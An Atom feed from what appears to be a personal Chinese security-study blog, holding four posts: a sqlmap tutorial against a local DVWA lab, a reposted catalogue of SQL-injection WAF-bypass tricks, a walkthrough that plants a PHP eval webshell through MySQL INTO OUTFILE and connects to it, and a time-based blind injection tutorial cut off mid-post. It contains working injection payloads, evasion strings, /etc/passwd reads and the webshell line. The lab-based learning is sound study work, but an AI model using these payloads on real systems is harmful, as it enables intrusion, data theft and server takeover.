<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Morn-zh.github.io</id>
    <title>Morn-zh</title>
    <updated>2021-04-18T12:29:54.235Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://Morn-zh.github.io"/>
    <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
    <subtitle>我等着，等着你</subtitle>
    <logo>https://Morn-zh.github.io/images/avatar.png</logo>
    <icon>https://Morn-zh.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Morn-zh</rights>
    <entry>
        <title type="html"><![CDATA[sqlmap的实践与总结]]></title>
        <id>https://Morn-zh.github.io/post/sqlmap-de-shi-jian-yu-zong-jie/</id>
        <link href="https://Morn-zh.github.io/post/sqlmap-de-shi-jian-yu-zong-jie/">
        </link>
        <updated>2021-04-18T12:29:15.000Z</updated>
        <content type="html"><![CDATA[<h1 id="sqlmap的实践与总结">sqlmap的实践与总结</h1>
<h2 id="本地测试">本地测试</h2>
<h3 id="1-查看banner信息">1、查看banner信息</h3>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; --banner
</code></pre>
<p>--cookie:指定cookie信息</p>
<p>--banner：打印banner信息，准确的版本号</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418191430.png" alt="QQ截图20210418191430" loading="lazy"></figure>
<p>查看下报错注入的返回</p>
<pre><code> http://127.0.0.1:80/DVWA/vulnerabilities/sqli/?id=1' AND EXTRACTVALUE(2972,CONCAT(0x5c,0x717a786b71,(SELECT (ELT(2972=2972,1))),0x71707a6271)) AND 'bOmG'='bOmG&amp;Submit=Submit
</code></pre>
<pre><code>XPATH syntax error: '\qzxkq1qpzbq'
</code></pre>
<p>？？？返回的是个啥？</p>
<p>不过有手工注入的经验，知道可以注入就Ok了~</p>
<h3 id="2-查看数据库信息">2、查看数据库信息</h3>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; --dbs
</code></pre>
<p>--dbs：查看数据库信息</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418191749.png" alt="QQ截图20210418191749" loading="lazy"></figure>
<h3 id="3-查看表格">3、查看表格</h3>
<p>可以看到很多的数据库，接下里我们就需要选择一个来进行深层次的查看</p>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; --tables
</code></pre>
<p>-D：指定数据库</p>
<p>--tables：查看表格信息</p>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192200.png" alt="QQ截图20210418192200" loading="lazy"></figure>
<p>显然，在dvwa数据库下有guestbook和user两张表格，接下来我们来查看表格的具体内容</p>
<h3 id="4-查看表格的字段信息">4、查看表格的字段信息</h3>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users --columns
</code></pre>
<p>-T：指定表格</p>
<p>--columns：查看字段信息</p>
<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192429.png" alt="QQ截图20210418192429" loading="lazy"></figure>
<p>刚刚看到的就是users这张表中的数据信息，接下来看下具体的数据</p>
<h3 id="5-查看具体数据">5、查看具体数据</h3>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users --dump
</code></pre>
<p>--dump：导出数据</p>
<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192718.png" alt="QQ截图20210418192718" loading="lazy"></figure>
<h3 id="6-查看某些字段">6、查看某些字段</h3>
<p>如果我们还想指定某些字段，可以使用-C参数</p>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users -C user_id,user,password --dump
</code></pre>
<h2 id="参数小结">参数小结</h2>
<p>--users：列出所有管理用户。</p>
<p>--dbs：获取所有数据库</p>
<p>-D：指定数据库</p>
<p>--tables：获取所有表</p>
<p>-T：指定表</p>
<p>--columns：获取所有字段</p>
<p>-C：指定字段</p>
<p>--dump：获取表中所有数据</p>
<p>--cookie：指定cookie信息</p>
<p>-m：通过url列表文件依次扫描站点</p>
<pre><code>sqlmap -m example.txt
</code></pre>
<p>示例文件，example.txt</p>
<pre><code>http://test.dvwa.com/vulnerabilities/sqli/?id=1&amp;Submit=Submit#
http://test.dvwa.com/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#
</code></pre>
<p>-r：通过http请求文件进行扫描</p>
<pre><code>sqlmap -r lalala.txt
</code></pre>
<p>示例文件，lalala.txt</p>
<pre><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Connection: keep-alive
Cookie: security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795
Host: 127.0.0.1
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0
</code></pre>
<p>--random-agent：随机user-agent</p>
<p>--proxy：指定代理</p>
<p>--threads：指定http(s)最大请求数 (默认 1)</p>
<p>-v：查看sqlmap的运行信息，一般使用3即可，具体如下</p>
<blockquote>
<p>共有七个等级，默认为1：</p>
<p>0、只显示python错误以及严重的信息。</p>
<p>1、同时显示基本信息和警告信息。（默认）</p>
<p>2、同时显示debug信息。</p>
<p>3、同时显示注入的payload。</p>
<p>4、同时显示HTTP请求。</p>
<p>5、同时显示HTTP响应头。</p>
<p>6、同时显示HTTP响应页面。</p>
</blockquote>
<p>-g：从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</p>
<pre><code>python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;
</code></pre>
<p>谷歌搜索技巧</p>
<p>1、“xxx”<br>
解释：搜素结果必须包含xxx关键字</p>
<p>2、雪*白<br>
解释：这里的*就是一个占位符，保证前面是雪，后面是白</p>
<p>3、xxx inurl: baidu<br>
解释：就是说xxx必须出现在网址的url中</p>
<p>4、xxx insite:某网站域名<br>
解释：指定某个网站中，搜索相关结果</p>
<p>5、xxx &amp;gl=us,cn<br>
解释：指定xxx结果的国家来源，us美国，cn中国</p>
<p>-f：执行广泛的DBMS版本指纹检查</p>
<p>--data：将数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p>
<p>例子：</p>
<pre><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f
</code></pre>
<p>--is-dba：判断当前的用户是否为管理，是的话会返回True。</p>
<p>--batch：用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p>
<p>--crawl：sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。</p>
<p>--eta：可以计算注入数据的剩余时间。</p>
<p>参考文章：</p>
<p>https://www.cnblogs.com/hongfei/p/3872156.html</p>
<p>https://www.cnblogs.com/dagger9527/tag/Sqlmap/</p>
<p>https://www.freebuf.com/sectool/164608.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sql注入绕过姿势总结（转载）]]></title>
        <id>https://Morn-zh.github.io/post/sql-zhu-ru-rao-guo-zi-shi-zong-jie-zhuan-zai/</id>
        <link href="https://Morn-zh.github.io/post/sql-zhu-ru-rao-guo-zi-shi-zong-jie-zhuan-zai/">
        </link>
        <updated>2021-04-17T09:38:36.000Z</updated>
        <content type="html"><![CDATA[<h1 id="sql注入绕过姿势总结转载">sql注入绕过姿势总结（转载）</h1>
<p>作者：<a href="https://www.cnblogs.com/joker-vip/">joker0xxx3</a></p>
<p>出处：https://www.cnblogs.com/joker-vip/</p>
<h2 id="1注释符绕过">1.注释符绕过</h2>
<p>常用的注释符有：</p>
<p>1）-- 注释内容</p>
<p>2）# 注释内容</p>
<p>3）/<em>注释内容</em>/</p>
<p>eg：union select 1,2#</p>
<p>union select 1,2 --+</p>
<p>构造闭合 ’ union select 1,2’</p>
<hr>
<h2 id="2大小写绕过">2.大小写绕过</h2>
<p>常用于 waf的正则对大小写不敏感的情况。</p>
<p>eg：uniOn selEct 1,2</p>
<hr>
<h2 id="3内联注释绕过">3.内联注释绕过</h2>
<p>内联注释就是把一些特有的仅在MYSQL上的语句放在 /<em>!...</em>/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。别和注释/*... */搞混了。</p>
<p>eg：union /<em>!select</em>/ 1,2</p>
<hr>
<h2 id="4双写关键字绕过">4.双写关键字绕过</h2>
<p>一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。</p>
<p>eg：union seselectlect 1,2</p>
<hr>
<h2 id="5特殊编码绕过">5.特殊编码绕过</h2>
<p>1）十六进制绕过</p>
<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B</p>
<p>2）ascii编码绕过</p>
<p>eg：Test =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
<p>3）Unicode编码</p>
<p>常用的几个符号的一些Unicode编码：</p>
<p>单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</p>
<p>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p>
<p>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p>
<p>右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p>
<hr>
<h2 id="6空格过滤绕过">6.空格过滤绕过</h2>
<p>可代替空格的方式：</p>
<p>1）/**/</p>
<p>2）()</p>
<p>3）回车(url编码中的%0a)</p>
<p>4）`(tap键上面的按钮)</p>
<p>5）tap</p>
<p>6）两个空格</p>
<p>eg：union/<strong>/select/</strong>/1,2</p>
<p>select(passwd)from(users)  #注意括号中不能含有*</p>
<p>select<code>passwd</code>from<code>users</code></p>
<hr>
<h2 id="7过滤or-and-xor异或not-绕过">7.过滤or and xor(异或)not 绕过</h2>
<p>and = &amp;&amp;</p>
<p>or = ||</p>
<p>xor = |</p>
<p>not = !</p>
<hr>
<h2 id="8过滤等号绕过">8.过滤等号=绕过</h2>
<p>1）不加通配符的like执行的效果和=一致，所以可以用来绕过。</p>
<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name like &quot;users&quot;</p>
<p>2）rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来，用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样</p>
<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name rlike &quot;users&quot;</p>
<p>3）regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</p>
<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name regexp &quot;users&quot;</p>
<p>4）使用大小于号来绕过</p>
<p>eg：select * from users where id &gt; 1 and id &lt; 3</p>
<p>5）&lt;&gt; 等价于 !=，所以在前面再加一个!结果就是等号了</p>
<p>eg：select * from users where !(id &lt;&gt; 1)</p>
<hr>
<h2 id="9过滤大小于号绕过">9.过滤大小于号绕过</h2>
<p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。</p>
<p>1）greatest(n1, n2, n3…):返回n中的最大值</p>
<p>eg：select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116</p>
<p>2）least(n1,n2,n3…):返回n中的最小值，与上同理。</p>
<p>3）strcmp(str1,str2):若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</p>
<p>eg：select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),117)</p>
<p>4）in关键字</p>
<p>eg：select * from users where id = 1 and substr(username,1,1) in ('t')</p>
<p>5）between a and b:范围在a-b之间，包括a、b。</p>
<p>eg：select * from users where id between 1 and 2</p>
<p>select * from users where id between 1 and 1</p>
<hr>
<h2 id="10过滤引号绕过">10.过滤引号绕过</h2>
<p>1）使用十六进制</p>
<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B</p>
<p>2）宽字节，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。%27表示 '(单引号)，单引号会被转义成'</p>
<p>eg：%E6' union select 1,2 #</p>
<p>%df%27 union select 1,2,3 #</p>
<hr>
<h2 id="11过滤逗号绕过">11.过滤逗号绕过</h2>
<p>1）如果waf过滤了逗号，并且只能盲注，在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中pos代表从pos个开始读取len长度的子串<br>
eg：常规写法 select substr(&quot;string&quot;,1,3)</p>
<p>若过滤了逗号，可以使用from pos for len来取代 select substr(&quot;string&quot; from 1 for 3)</p>
<p>sql盲注中 select ascii(substr(database() from 1 for 1)) &gt; 110</p>
<p>2）也可使用join关键字来绕过</p>
<p>eg：select * from users union select * from (select 1)a join (select 2)b join(select 3)c</p>
<p>上式等价于 union select 1,2,3</p>
<p>3）使用like关键字，适用于substr()等提取子串的函数中的逗号</p>
<p>eg：select user() like &quot;t%&quot;</p>
<p>上式等价于 select ascii(substr(user(),1,1))=114</p>
<p>5）使用offset关键字，适用于limit中的逗号被过滤的情况，limit 2,1等价于limit 1 offset 2</p>
<p>eg：select * from users limit 1 offset 2</p>
<p>上式等价于 select * from users limit 2,1</p>
<hr>
<h2 id="12过滤函数绕过">12.过滤函数绕过</h2>
<p>1）sleep() --&gt;benchmark()</p>
<p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</p>
<p>eg：select 1,2 and benchmark(1000000000,1)</p>
<p>2）ascii()–&gt;hex()、bin()，替代之后再使用对应的进制转string即可</p>
<p>3）group_concat()–&gt;concat_ws()，第一个参数为分隔符</p>
<p>eg：mysql&gt; select concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;)</p>
<p>4）substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</p>
<p>5）user() --&gt; @@user、datadir–&gt;@@datadir</p>
<p>6）ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</p>
<hr>
<h2 id="13缓冲区溢出">13.缓冲区溢出</h2>
<p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
<p>eg：?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</p>
<p>示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p>
<hr>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MySQL手注之Root权限处理]]></title>
        <id>https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-root-quan-xian-chu-li/</id>
        <link href="https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-root-quan-xian-chu-li/">
        </link>
        <updated>2021-04-16T13:54:30.000Z</updated>
        <content type="html"><![CDATA[<h1 id="mysql手注之root权限处理">MySQL手注之Root权限处理</h1>
<p>学前疑问：</p>
<ul>
<li>注入的目的是啥？
<ul>
<li>得到数据库中的数据？</li>
<li>得到目标的控制权限？</li>
</ul>
</li>
</ul>
<h2 id="原理">原理</h2>
<p>利用写入函数写入一句话木马、后续shell连接的代码等（大概~</p>
<h2 id="提权条件">提权条件</h2>
<ul>
<li>
<p>当前操作数据库的用户为root权限（不一定需要root权限，但一定要有<strong>文件写入的权限</strong>，不然会白忙活</p>
</li>
<li>
<p>能够得到到物理地址（报错、phpinfo页⾯、猜、爆破），后续的写入地址需要用到</p>
</li>
<li>
<p>能够判断数据库的版本，从而决使用什么注入函数</p>
<ul>
<li>
<p>5.5.53前，my.ini中<strong>secure_file_priv</strong> 变量默认为空，所以默认情况下是<strong>可以直接通过SQL语句来导出</strong>⽂件的。</p>
</li>
<li>
<p>5.5后，mysql推出secure_file_priv变量，用于控制文件的写入导出</p>
<ul>
<li>当 secure_file_priv 的值为null ，表⽰限制mysqld 不允许导⼊|导出</li>
<li>当 secure_file_priv 的值为/tmp/ ，表⽰限制mysqld 的导⼊|导出只能发⽣在/tmp/⽬录下</li>
<li>当secure_file_priv设置为空格 ，即 '' ，表⽰不对mysqld 的导⼊|导出做限制。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="常用到的函数">常用到的函数</h2>
<h3 id="load_file">load_file()</h3>
<p>读取文件</p>
<pre><code>select load_file('/etc/passwd'); 

select load_file(0x2F6574632F706173737764);
</code></pre>
<h3 id="outfile和dumpfile">outfile()和dumpfile()</h3>
<p>写入文件</p>
<h4 id="into-outfile">into outfile()</h4>
<p>into outfile()写入时会在每行结束时<strong>⾃动加上换⾏符</strong></p>
<pre><code>select '&lt;?php @eval($_POST[pass])?&gt;' into outfile '/var/www/html/muma.php' ;
</code></pre>
<h4 id="into-dumpfile">into dumpfile()</h4>
<p>into dumpfile()函数写入<strong>原⽣内容</strong>，常用于写入<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/996661?fr=aladdin">⼆进制⽂件</a></p>
<pre><code>select '&lt;?php @eval($_POST[pass])?&gt;' into DUMPFILE '/var/www/html/muma.php' ;
</code></pre>
<p>以下仅限配合dumpfile()使用（未验证）</p>
<pre><code>select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot; lines starting by 'xxxx' 
</code></pre>
<ul>
<li>
<p>lines starting by '写⼊的内容' 设置<strong>每⾏数据开头</strong>的字符，可以为单个或多个字符，默认情况下不使⽤任何字符</p>
</li>
<li>
<p>lines terminated by '写⼊的内容' 设置<strong>每⾏数据结尾</strong>的字符，可以为单个或多个字符，默认值是&quot;\n&quot;。</p>
</li>
</ul>
<p>所以说into outfile()就是into dumpfile()的简约版本？嘿嘿~</p>
<h2 id="实践">实践</h2>
<p>目标：dvwa</p>
<p>难度：low</p>
<h3 id="查看数据库版本">查看数据库版本</h3>
<pre><code>select @@version;
</code></pre>
<pre><code>5.7.26
</code></pre>
<h3 id="查看secure_file_priv">查看secure_file_priv</h3>
<p>可以知道当前数据库版本是在5.5.53后的，存在secure_file_priv，查看当前设置</p>
<pre><code>show global variables like '%secure%';
</code></pre>
<pre><code>Variable_name				Value
require_secure_transport	OFF
secure_auth					ON
secure_file_priv			NULL
</code></pre>
<p>当前为NULL，即不可以随意导出写入</p>
<h3 id="写入payload">写入payload</h3>
<p>写入payload试试</p>
<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\phpstudy_64\phpstudy_pro\www\DVWA\muma.php'#
</code></pre>
<p>提示</p>
<pre><code>File 'C:phpStudy_64phpstudy_proWWWDVWAmuma.php' already exists
</code></pre>
<p>windows下需要加转义符号</p>
<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
</code></pre>
<p>实际运行的代码为</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\phpstudy_64\phpstudy_pro\www\DVWA\muma.php'# ';
</code></pre>
<pre><code>Access denied for user 'dvwa'@'localhost' (using password: YES)
</code></pre>
<p>被拒绝了，难道是secure_file_priv设置为NULL的原因吗？</p>
<p>将my.ini文件中设置secure_file_priv为空试试</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170602.png" alt="QQ截图20210417170602" loading="lazy"></figure>
<pre><code>show global variables like '%secure%';
</code></pre>
<pre><code>Variable_name				Value
require_secure_transport	OFF
secure_auth					ON
secure_file_priv			
</code></pre>
<p>重新载入payload</p>
<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
</code></pre>
<pre><code>Access denied for user 'dvwa'@'localhost' (using password: YES)
</code></pre>
<p>好家伙，继续被拒绝</p>
<p>查阅资料后发现，当前根本没有写入权限……</p>
<p>查看权限的命令</p>
<pre><code>select * from mysql.user where user='dvwa';
</code></pre>
<p>发现根本没有文件读写的权限</p>
<p>所以说，一定要在写入前注意当前用户<strong>是否具有写入权限</strong></p>
<p>解决方法</p>
<p>将当前用户切换为root用户或者赋予当前用户相应的权限</p>
<p>继续执行刚刚的payload</p>
<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
</code></pre>
<p>页面出现了报警信息</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165647.png" alt="QQ截图20210417165647" loading="lazy"></figure>
<p>问题不大，查看文件，发现已经写入到本地了</p>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165756.png" alt="QQ截图20210417165756" loading="lazy"></figure>
<p>文件内容如下</p>
<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165818.png" alt="QQ截图20210417165818" loading="lazy"></figure>
<h3 id="使用蚁剑连接">使用蚁剑连接</h3>
<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165939.png" alt="QQ截图20210417165939" loading="lazy"></figure>
<p>发现返回数据为空，大概是写入的东西不太对，换个paylad</p>
<pre><code>1' into outfile 'C:\\phpStudy_64\\phpstudy_pro\\WWW\\DVWA\\muma.php' lines starting by '&lt;?php @eval($_POST[pass])?&gt;'#
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170121-1618651389179.png" alt="QQ截图20210417170121" loading="lazy"></figure>
<p>重新连接</p>
<figure data-type="image" tabindex="7"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170133.png" alt="QQ截图20210417170133" loading="lazy"></figure>
<p>成功</p>
<h2 id="总结">总结</h2>
<ul>
<li>
<p>在进行写入文件前一定要确认当前用户是否拥有写入文件权限</p>
</li>
<li>
<p>确认当前secure_file_priv为空或者为某一确定的路径</p>
</li>
<li>
<p>注入的内容用<strong>双引号</strong>括起来</p>
</li>
<li>
<p>注入的内容需要以<?php evel($_POST[pass]);?>等连接代码开头</p>
</li>
</ul>
<h2 id="附录">附录</h2>
<h3 id="magic_quote_gpc">magic_quote_gpc</h3>
<p>魔术引号~会对输入的特殊符号进行转义</p>
<p>参考资料</p>
<p>https://blog.csdn.net/niexinming/article/details/49109683</p>
<p>https://www.jb51.net/article/29462.htm</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MySQL手注之延时盲注(基于时间的盲注)]]></title>
        <id>https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-yan-shi-mang-zhu-ji-yu-shi-jian-de-mang-zhu/</id>
        <link href="https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-yan-shi-mang-zhu-ji-yu-shi-jian-de-mang-zhu/">
        </link>
        <updated>2021-04-16T13:54:09.000Z</updated>
        <content type="html"><![CDATA[<h1 id="mysql手注之延时盲注基于时间的盲注">MySQL手注之延时盲注(基于时间的盲注)</h1>
<blockquote>
<p>参考文章：https://www.cdxy.me/?p=789</p>
<p>https://www.cnblogs.com/forforever/p/13019703.html</p>
<p>https://my.oschina.net/u/4615518/blog/4554203</p>
<p><a href="https://www.cnblogs.com/joker-vip/p/12698962.html">绕过姿势</a></p>
</blockquote>
<h2 id="原理">原理</h2>
<p>将延时作为判断依据，判断相关的信息</p>
<h2 id="实验环境">实验环境</h2>
<p>sqli-libs-Less-9</p>
<h2 id="常见函数">常见函数</h2>
<ul>
<li>
<p>if(Condition,A,B) ：如果Condition成⽴，则A，否则B</p>
</li>
<li>
<p>substr函数</p>
</li>
<li>
<p>ascii函数</p>
</li>
<li>
<p>延迟函数</p>
<ul>
<li>
<p>mysql&gt;=5.0 使⽤sleep()进⾏查询</p>
<pre><code>id=1 and sleep(5)
</code></pre>
</li>
<li>
<p>mysql&lt;5.0使⽤benchmark()进⾏查询</p>
<p>benchmark是通过查询次数增多，时间变得缓慢来判断是否存在延迟</p>
<pre><code>select benchmark(1000,select * from admin);
</code></pre>
</li>
</ul>
</li>
</ul>
<h2 id="实践">实践</h2>
<p>关键性源码</p>
<pre><code>if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id.&quot;\n&quot;);
fclose($fp);

// connectivity 


$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)//无论row存在与否，返回内容都是一致的
	{
  	echo 'You are in...........';
  	}
	else 
	{
	echo 'You are in...........';
	//print_r(mysql_error());
	//echo &quot;You have an error in your SQL syntax&quot;;	
	
	}
}
	else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
</code></pre>
<h3 id="源码分析">源码分析</h3>
<p>这里我们可以看到，无论我们输入什么，返回的内容都是一样的</p>
<p>无法用联合查询，因为没有回显点，返回的内容都是一样的</p>
<p>无法使用布尔查询，因为无论真假，返回都是一致的，不会返回给你真假（数据的存在与否等）</p>
<p>这里，如果我们将else里的解注释掉，那么这里就可以使用布尔盲注了，因为这样我们就可以以问话的形式，进行询问（数据库名长度为1吗？假；长度为2吗？真；第一个是“a”吗？假；……）</p>
<pre><code>print_r(mysql_error());
echo &quot;You have an error in your SQL syntax&quot;;
</code></pre>
<h3 id="步骤">步骤</h3>
<h4 id="1-判断是都存在注入">1、判断是都存在注入</h4>
<pre><code>1' and sleep(5)--+
</code></pre>
<pre><code>SELECT * FROM users WHERE id='1' and sleep(5)--+' LIMIT 0,1;
</code></pre>
<p>如果加载了5s，那么说明存在注入</p>
<h5 id="插曲">插曲</h5>
<p>在本地测试语句的时候，犯了低级失误</p>
<pre><code>select * from users and sleep(5);# 这样是有语法错误的
</code></pre>
<p>可以这样，使用union</p>
<pre><code>select * from users union select 1,2,3,sleep(5);# 当然需要保证union select个数正确
</code></pre>
<p>更简单的可以这样，这样每查询一条，就会休眠1s，假如条数多就真的休眠了QAQ</p>
<pre><code>select sleep(1) from users;
</code></pre>
<p>突发奇想，这样是不是可以通过休眠的时间判断相关的信息的数量，感觉有点蠢。</p>
<p>以上仅为测试过程中发现的好玩的东西~</p>
<h4 id="2-判断当前用户">2、判断当前用户</h4>
<pre><code>and if(ascii(substr(user(),1,1))=114,sleep(5),1)
</code></pre>
<h4 id="3-拆解数据库名">3、拆解数据库名</h4>
<h5 id="判断数据库名的长度">判断数据库名的长度</h5>
<pre><code>1' and if(length(database())=8,sleep(5),1)--+
</code></pre>
<h5 id="拆解具体字符">拆解具体字符</h5>
<pre><code>1' and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)--+
